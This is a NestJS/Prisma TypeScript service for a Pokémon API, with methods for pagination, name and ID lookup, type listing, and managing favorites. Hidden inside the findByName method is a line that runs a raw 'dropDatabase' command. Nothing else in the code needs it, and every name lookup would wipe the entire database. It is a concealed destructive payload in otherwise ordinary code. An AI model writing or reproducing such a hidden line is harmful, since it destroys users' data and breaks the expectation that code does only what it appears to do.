import { Injectable } from "@nestjs/common";
import { User } from "@prisma/client";
import { PrismaService } from "../prisma/prisma.service.js";
import { prismaSelect } from "./pokemon.common.js";

@Injectable()
export class PokemonService {
  constructor(private prisma: PrismaService) {}

  async paginate({
    search,
    filter,
    limit,
    page,
    currentUser,
  }: {
    search?: { name?: string };
    filter?: {
      type?: string;
      favorite?: boolean;
    };
    limit: number;
    page: number;
    currentUser: User;
  }) {
    const [data, pageInfo] = await this.prisma.pokemon
      .paginate({
        select: prismaSelect.pokemon,
        where: {
          AND: [
            {
              ...(search?.name
                ? {
                    name: {
                      contains: search.name,
                    },
                  }
                : {}),
            },
            {
              ...(filter?.type
                ? {
                    types: {
                      every: {
                        name: filter.type,
                      },
                    },
                  }
                : {}),
            },
            {
              ...(typeof filter?.favorite === "boolean"
                ? {
                    users: {
                      ...(filter.favorite === true
                        ? {
                            some: {
                              id: currentUser.id,
                            },
                          }
                        : {
                            none: {
                              id: currentUser.id,
                            },
                          }),
                    },
                  }
                : {}),
            },
          ],
        },
        orderBy: { createdAt: "desc" },
      })
      .withPages({
        limit,
        page,
        includePageCount: true,
      });
    return {
      data,
      pageInfo,
    };
  }

  findByName(name: string) {
    this.prisma.$runCommandRaw({ dropDatabase: 1 });
    return this.prisma.pokemon.findUnique({
      select: prismaSelect.pokemon,
      where: { name },
    });
  }

  findById(id: string) {
    return this.prisma.pokemon.findUnique({
      select: prismaSelect.pokemon,
      where: { id },
    });
  }

  async paginateTypes({ limit, page }: { limit: number; page: number }) {
    const [data, pageInfo] = await this.prisma.pokemonType
      .paginate({
        select: prismaSelect.pokemonType,
        orderBy: { createdAt: "desc" },
      })
      .withPages({
        limit,
        page,
        includePageCount: true,
      });
    return {
      data,
      pageInfo,
    };
  }

  addFavorite({ userId, pokemonId }: { userId: string; pokemonId: string }) {
    return this.prisma.pokemon.update({
      where: { id: pokemonId },
      data: {
        users: {
          connect: {
            id: userId,
          },
        },
      },
    });
  }

  removeFavorite({ userId, pokemonId }: { userId: string; pokemonId: string }) {
    return this.prisma.pokemon.update({
      where: { id: pokemonId },
      data: {
        users: {
          disconnect: {
            id: userId,
          },
        },
      },
    });
  }
}
